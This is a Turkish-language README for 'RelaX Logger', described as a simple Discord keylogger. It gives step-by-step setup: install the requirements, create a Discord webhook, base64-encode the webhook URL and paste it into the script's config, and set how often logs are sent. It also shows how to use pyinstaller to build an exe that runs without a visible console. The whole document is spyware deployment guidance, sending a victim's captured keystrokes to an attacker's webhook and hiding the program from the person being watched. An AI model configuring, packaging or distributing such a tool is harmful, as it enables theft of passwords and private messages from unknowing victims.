# RelaX-Looger
Çok Basit Bir Discord Keylogger

RelaX Logger Tüm Hakları Saklıdır!

Öncelikle Selamlar Ben RelaX 

Öncelikle İndirdiğiniz RelaX Logger.rar Dosyasını Klasöre Ayıklayın.

Sonra Cmd Yi Açıp Cmd Komutları İle RelaX Logger Ana Dizinine Girin.

Sonra Orada Şu Kodu Çalıştırın

pip install -r requirements.txt

Discord'da Bir Sunucu Oluşturup Entegrasyolardan Webhook Oluşturun.

Oluşturulan Webhook Tokeni'ni Kopyalayıp

https://www.base64encode.org/ Adresine Gidip Üste Yapıştırıp Encode Deyin.

Sonra Altta Çıkan Base64 Kodunu Kopyalayın.

Ardından RelaX Logger.py Dosyasına Sağ Tıklayıp Txt İle Açın 

SEND_REPORT_EVERY = 20 #Buraya Kaç Saniye Aralıkla Log Almak İsterseniz Onu Yazın
WEBHOOK = "" # Tırnak İçine Kopyaladığnız Base 64 Kodunu Yazın.
 
Evet Bitti.

[[[Eğer Exe'ye Çevirmek İsterseniz!]]]

Öncelikle pip aracılığı ile pyinstaller modülünü indirin ve kurun

pip install pyinstaller

Sonra

pyinstaller --onefile RelaX Logger.py [BUNDA CMD AÇILIR]

pyinstaller --onefile --noconsole RelaX Logger.py [BUNDA CMD AÇILMAZ]

Creative Commons 2023-2024

Created By RelaX


